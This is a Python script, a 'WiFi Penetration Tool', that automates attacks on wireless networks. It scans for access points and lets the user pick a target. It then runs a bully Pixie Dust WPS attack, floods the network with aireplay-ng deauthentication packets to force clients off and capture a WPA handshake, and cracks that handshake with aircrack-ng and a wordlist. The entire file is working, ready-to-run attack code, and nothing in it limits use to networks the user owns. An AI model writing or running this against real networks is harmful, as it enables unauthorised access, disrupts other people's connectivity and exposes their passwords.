#!/usr/bin/env python3

import os
import sys
import shutil
import subprocess
import time
import re
import csv
import atexit

# ANSI Colors
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'

REQUIRED_TOOLS = [
    "aircrack-ng",      # Includes airmon-ng, airodump-ng, aireplay-ng
    "reaver",           # WPS attack tool
    "bully",            # WPS attack tool (alternative)
    "macchanger",       # MAC address changer
    "pixiewps",         # Offline WPS attack tool
    "hcxdumptool",      # PMKID capture
    "hcxpcapngtool",    # PMKID extraction (part of hcxtools)
    "hashcat",          # Password recovery
]

class Target:
    def __init__(self, bssid, power, channel, encryption, ssid):
        self.bssid = bssid
        self.power = power
        self.channel = channel
        self.encryption = encryption
        self.ssid = ssid

    def __str__(self):
        return f"{self.bssid}  {self.power}  {self.channel}  {self.encryption}  {self.ssid}"

def check_root():
    """Check if the script is running as root."""
    if os.geteuid() != 0:
        print(f"{RED}[-] This script must be run as root!{RESET}")
        sys.exit(1)

def install_tool(tool_name):
    """Attempt to install a tool using apt-get."""
    print(f"{YELLOW}[*] Tool '{tool_name}' not found. Installing...{RESET}")
    try:
        subprocess.check_call(["apt-get", "install", "-y", tool_name])
        print(f"{GREEN}[+] Successfully installed {tool_name}{RESET}")
        return True
    except subprocess.CalledProcessError:
        print(f"{RED}[-] Failed to install {tool_name}. Please install it manually.{RESET}")
        return False

def check_deps():
    """Check for required dependencies and install if missing."""
    print(f"{BLUE}[*] Checking dependencies...{RESET}")
    missing_tools = []

    # Check each tool
    for tool in REQUIRED_TOOLS:
        if shutil.which(tool) is None:
            # Special handling for package names vs binary names if needed
            pkg_name = tool
            if tool == "hcxpcapngtool":
                pkg_name = "hcxtools"

            if not install_tool(pkg_name):
                missing_tools.append(tool)

    if missing_tools:
        print(f"{RED}[-] The following tools could not be installed automatically: {', '.join(missing_tools)}{RESET}")
        print(f"{RED}[-] Please install them manually and re-run the script.{RESET}")
        # We might continue if some are optional, but for now let's warn.
    else:
        print(f"{GREEN}[+] All dependencies met.{RESET}")

def kill_conflicting_processes():
    """Kill processes that might interfere with monitor mode."""
    print(f"{YELLOW}[*] Killing conflicting processes...{RESET}")
    try:
        subprocess.run(["airmon-ng", "check", "kill"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"{RED}[-] Error killing processes: {e}{RESET}")

def get_wireless_interfaces():
    """Get a list of wireless interfaces using iwconfig."""
    interfaces = []
    try:
        output = subprocess.check_output(["iwconfig"], stderr=subprocess.STDOUT).decode('utf-8')
        for line in output.split('\n'):
            if 'no wireless extensions' not in line and len(line) > 0 and not line.startswith(' '):
                interface = line.split()[0]
                interfaces.append(interface)
    except subprocess.CalledProcessError:
        pass # iwconfig might return non-zero if no wireless extensions are found
    except FileNotFoundError:
        print(f"{RED}[-] iwconfig not found. Please install wireless-tools.{RESET}")
    return interfaces

def enable_monitor_mode(interface):
    """Enable monitor mode on the specified interface using airmon-ng."""
    print(f"{YELLOW}[*] Enabling monitor mode on {interface}...{RESET}")
    kill_conflicting_processes()
    try:
        subprocess.check_call(["airmon-ng", "start", interface])
        # Usually creates a new interface with 'mon' suffix, or renames existing one.
        # We need to find the new monitor interface name.
        time.sleep(2)
        interfaces = get_wireless_interfaces()
        # Heuristic: look for interface containing original name + 'mon' or just 'mon'
        # But simpler: just re-scan interfaces and find one in monitor mode.
        for iface in interfaces:
            if is_monitor_mode(iface):
                print(f"{GREEN}[+] Monitor mode enabled on {iface}{RESET}")
                return iface
        print(f"{RED}[-] Could not determine monitor interface.{RESET}")
        return None
    except subprocess.CalledProcessError as e:
        print(f"{RED}[-] Failed to enable monitor mode: {e}{RESET}")
        return None

def disable_monitor_mode(interface):
    """Disable monitor mode."""
    print(f"{YELLOW}[*] Disabling monitor mode on {interface}...{RESET}")
    try:
        subprocess.check_call(["airmon-ng", "stop", interface])
        print(f"{GREEN}[+] Monitor mode disabled on {interface}{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}[-] Failed to disable monitor mode: {e}{RESET}")

def is_monitor_mode(interface):
    """Check if an interface is in monitor mode."""
    try:
        output = subprocess.check_output(["iwconfig", interface], stderr=subprocess.STDOUT).decode('utf-8')
        return "Mode:Monitor" in output
    except:
        return False

def select_interface():
    """Interactively select a wireless interface."""
    interfaces = get_wireless_interfaces()
    if not interfaces:
        print(f"{RED}[-] No wireless interfaces found.{RESET}")
        sys.exit(1)

    print(f"\n{BLUE}Available Wireless Interfaces:{RESET}")
    for i, iface in enumerate(interfaces):
        mode = "Monitor" if is_monitor_mode(iface) else "Managed"
        color = GREEN if mode == "Monitor" else YELLOW
        print(f"{i + 1}. {iface} [{color}{mode}{RESET}]")

    while True:
        try:
            choice = input(f"\n{BLUE}Select interface (number): {RESET}")
            idx = int(choice) - 1
            if 0 <= idx < len(interfaces):
                return interfaces[idx]
        except ValueError:
            pass
        print(f"{RED}Invalid selection.{RESET}")

def parse_scan_csv(filepath):
    targets = []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()

            ap_lines = []
            for line in lines:
                if line.strip() == "": continue
                if line.startswith("Station MAC"): break
                ap_lines.append(line)

            reader = csv.reader(ap_lines)
            for row in reader:
                if len(row) < 14: continue
                if row[0].strip() == "BSSID": continue # Header
                if row[0].strip() == "": continue

                bssid = row[0].strip()
                power = row[8].strip()
                channel = row[3].strip()
                encryption = row[5].strip()
                ssid = row[13].strip()

                targets.append(Target(bssid, power, channel, encryption, ssid))

    except Exception as e:
        pass
    return targets

def scan_networks(interface):
    print(f"{YELLOW}[*] Starting scan... Press Ctrl+C to stop and select a target.{RESET}")
    scan_file_prefix = "/tmp/wifi_tool_scan"

    # Clean up old files
    for ext in ["-01.csv", "-01.kismet.csv", "-01.kismet.netxml", "-01.log.csv", "-01.cap"]:
        fpath = scan_file_prefix + ext
        if os.path.exists(fpath):
            try:
                os.remove(fpath)
            except:
                pass

    cmd = ["airodump-ng", "--write", scan_file_prefix, "--output-format", "csv", interface]

    # Using a list for cmd is safer
    process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    targets = []
    try:
        while True:
            time.sleep(2)
            csv_file = scan_file_prefix + "-01.csv"
            if os.path.exists(csv_file):
                targets = parse_scan_csv(csv_file)
                # Sort by power (signal strength) descending
                targets.sort(key=lambda x: int(x.power) if x.power.strip('-').isdigit() else -100, reverse=True)

                os.system('clear')
                print(f"{YELLOW}[*] Scanning... Press Ctrl+C to stop.\n{RESET}")
                print(f"{'ID':<4} {'BSSID':<18} {'PWR':<5} {'CH':<4} {'ENC':<8} {'SSID'}")
                print("-" * 60)
                for i, t in enumerate(targets):
                    # Color code encryption
                    enc_color = GREEN if "WPA" in t.encryption else RED
                    print(f"{i+1:<4} {t.bssid:<18} {t.power:<5} {t.channel:<4} {enc_color}{t.encryption:<8}{RESET} {t.ssid}")
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[*] Stopping scan...{RESET}")
        process.terminate()
        try:
            process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()

    return targets

def select_target(targets):
    if not targets:
        print(f"{RED}[-] No targets found.{RESET}")
        return None

    while True:
        try:
            choice = input(f"\n{BLUE}Select target (ID): {RESET}")
            idx = int(choice) - 1
            if 0 <= idx < len(targets):
                return targets[idx]
        except ValueError:
            pass
        print(f"{RED}Invalid selection.{RESET}")

def check_handshake(cap_file):
    # Use aircrack-ng to check for handshake
    try:
        output = subprocess.check_output(["aircrack-ng", cap_file], stderr=subprocess.STDOUT).decode('utf-8')
        return "1 handshake" in output or "WPA (" in output
    except subprocess.CalledProcessError:
        return False

def capture_handshake(interface, target):
    print(f"{YELLOW}[*] Attempting to capture handshake for {target.ssid} ({target.bssid})...{RESET}")

    # Start airodump-ng on target channel
    output_prefix = f"/tmp/handshake_{target.bssid.replace(':', '')}"
    # Cleanup
    for ext in [".cap", ".csv", ".kismet.csv", ".kismet.netxml"]:
        if os.path.exists(output_prefix + "-01" + ext):
            os.remove(output_prefix + "-01" + ext)

    airodump_cmd = [
        "airodump-ng",
        "--bssid", target.bssid,
        "--channel", target.channel,
        "--write", output_prefix,
        interface
    ]

    # Run airodump in background
    airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print(f"{BLUE}[*] Listening for handshake...{RESET}")

    handshake_captured = False
    cap_file = output_prefix + "-01.cap"

    try:
        # Deauth loop
        deauth_count = 0
        while not handshake_captured and deauth_count < 10: # Try deauth a few times
            time.sleep(5)

            # check if handshake captured
            if os.path.exists(cap_file):
                if check_handshake(cap_file):
                    handshake_captured = True
                    break

            print(f"{YELLOW}[*] Sending deauth packets ({deauth_count+1}/10)...{RESET}")
            # aireplay-ng -0 5 -a <bssid> <interface>
            subprocess.run(["aireplay-ng", "-0", "5", "-a", target.bssid, interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            deauth_count += 1

        # Continue listening for a bit more if not captured
        if not handshake_captured:
            print(f"{YELLOW}[*] Waiting a bit more for handshake...{RESET}")
            for _ in range(5):
                time.sleep(2)
                if os.path.exists(cap_file) and check_handshake(cap_file):
                    handshake_captured = True
                    break

    except KeyboardInterrupt:
        print(f"{YELLOW}[*] Interrupted.{RESET}")
    finally:
        airodump_proc.terminate()
        try:
            airodump_proc.wait(timeout=2)
        except:
            airodump_proc.kill()

    if handshake_captured:
        print(f"{GREEN}[+] Handshake captured! Saved to {cap_file}{RESET}")
        return cap_file
    else:
        print(f"{RED}[-] Failed to capture handshake.{RESET}")
        return None

def attack_wps(interface, target):
    print(f"{YELLOW}[*] Checking for WPS on {target.ssid}...{RESET}")
    # Try bully if available
    if shutil.which("bully"):
        print(f"{BLUE}[*] Bully found. Attempting Pixie Dust attack...{RESET}")
        # bully <interface> -b <bssid> -c <channel> -d -v 3
        try:
            cmd = ["bully", interface, "-b", target.bssid, "-c", target.channel, "-d", "-v", "3"]
            print(f"{YELLOW}[*] Running: {' '.join(cmd)}{RESET}")
            subprocess.run(cmd, timeout=60) # Try for 60 seconds
        except subprocess.TimeoutExpired:
            print(f"{RED}[*] Bully timed out.{RESET}")
        except Exception as e:
            print(f"{RED}[-] Bully failed: {e}{RESET}")
    else:
        print(f"{RED}[-] Bully not found. Skipping WPS attack.{RESET}")

def crack_handshake(cap_file):
    print(f"\n{BLUE}[*] Do you want to try to crack the password now?{RESET}")
    choice = input(f"{YELLOW}Y/n: {RESET}").lower()
    if choice != 'n':
        wordlist = input(f"{BLUE}[*] Enter path to wordlist (default: /usr/share/wordlists/rockyou.txt): {RESET}").strip()
        if not wordlist:
            wordlist = "/usr/share/wordlists/rockyou.txt"

        if not os.path.exists(wordlist):
            print(f"{RED}[-] Wordlist {wordlist} not found.{RESET}")
            return

        print(f"{YELLOW}[*] Running aircrack-ng with {wordlist}...{RESET}")
        try:
            subprocess.run(["aircrack-ng", "-w", wordlist, cap_file])
        except Exception as e:
            print(f"{RED}[-] Error running aircrack-ng: {e}{RESET}")

def main():
    print(f"{GREEN}=========================================={RESET}")
    print(f"{GREEN}       WiFi Penetration Tool v1.0         {RESET}")
    print(f"{GREEN}=========================================={RESET}")

    check_root()
    check_deps()

    print(f"{GREEN}[+] Tool started.{RESET}")

    try:
        iface = select_interface()
        print(f"{GREEN}[*] Selected interface: {iface}{RESET}")

        # Keep track of original interface state to restore later if needed
        # (Though we won't implement full restoration on exit automatically to avoid disrupting persistent monitor usage)

        if not is_monitor_mode(iface):
            mon_iface = enable_monitor_mode(iface)
            if mon_iface:
                iface = mon_iface
            else:
                print(f"{RED}[-] Failed to switch to monitor mode.{RESET}")
                sys.exit(1)

        print(f"{GREEN}[+] Ready to scan on {iface}{RESET}")

        targets = scan_networks(iface)
        target = select_target(targets)

        if target:
            print(f"{GREEN}[*] Target selected: {target.ssid} ({target.bssid}) on Channel {target.channel}{RESET}")

            # Attack Sequence
            attack_wps(iface, target)
            cap_file = capture_handshake(iface, target)

            if cap_file:
                print(f"{GREEN}[+] You have a handshake file: {cap_file}{RESET}")
                print(f"{BLUE}[*] You can now use aircrack-ng or hashcat to crack the password.{RESET}")
                crack_handshake(cap_file)

        else:
            print(f"{RED}[-] No target selected. Exiting.{RESET}")
            sys.exit(0)

    except KeyboardInterrupt:
        print(f"\n{YELLOW}[*] Exiting...{RESET}")
        sys.exit(0)

if __name__ == "__main__":
    main()
